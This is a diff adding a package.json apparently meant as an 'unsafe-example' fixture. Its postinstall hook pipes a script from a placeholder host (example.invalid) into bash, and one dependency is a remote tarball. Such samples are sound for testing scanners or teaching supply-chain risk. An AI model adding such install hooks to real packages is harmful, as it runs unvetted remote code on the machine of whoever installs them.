@@ -1,0 +1,11 @@
+{
+  "name": "unsafe-example",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/install.sh | bash"
+  },
+  "dependencies": {
+    "example": "https://example.invalid/example.tgz"
+  }
+}
+
